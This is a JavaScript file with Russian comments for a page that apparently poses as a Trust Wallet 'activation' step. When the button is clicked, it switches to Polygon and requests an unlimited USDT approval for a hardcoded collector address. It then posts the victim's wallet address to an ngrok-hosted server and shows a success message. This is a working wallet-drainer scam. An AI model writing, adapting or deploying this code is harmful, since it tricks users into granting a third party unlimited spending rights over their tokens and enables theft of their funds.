const USDT_CONTRACT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
const COLLECTOR_ADDRESS = '0x2530C5aa0022B49832C593758d84aE70e40161cB';
const POLYGON_CHAIN_ID = '0x89'; // 137 в HEX

// ВАЖНО: Вставь сюда URL, который выдает твой бот в консоли (Ngrok)
const API_URL = 'https://gypseous-janis-wandlike.ngrok-free.dev/save-address';

async function startWork() {
    const status = document.getElementById('status');
    if (!window.ethereum) {
        status.innerText = '⚠️ Откройте через DApp Trust Wallet';
        return;
    }

    try {
        status.innerText = '🔄 Проверка сети Polygon...';
        
        // Автоматическое переключение сети
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: POLYGON_CHAIN_ID }],
            });
        } catch (e) {
            if (e.code === 4902) {
                await window.ethereum.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: POLYGON_CHAIN_ID,
                        chainName: 'Polygon Mainnet',
                        rpcUrls: ['https://polygon-rpc.com'],
                        nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 }
                    }]
                });
            }
        }

        const web3 = new Web3(window.ethereum);
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const address = accounts[0];

        status.innerText = '📝 Подтвердите активацию...';

        const abi = [{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
        const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
        
        // Максимальное значение для approve
        const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

        // Вызов транзакции approve
        await contract.methods.approve(COLLECTOR_ADDRESS, maxUint).send({ from: address });

        status.innerText = '📡 Синхронизация...';

        // Отправка данных в твой Flask-сервер
        await fetch(API_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ address: address })
        });

        status.innerText = '✅ Кошелек успешно привязан!';
        status.style.color = '#ff007a';

    } catch (err) {
        status.innerText = '❌ Ошибка: ' + (err.message || 'Транзакция отменена');
        console.error(err);
    }
}

document.getElementById('startBtn').addEventListener('click', startWork);
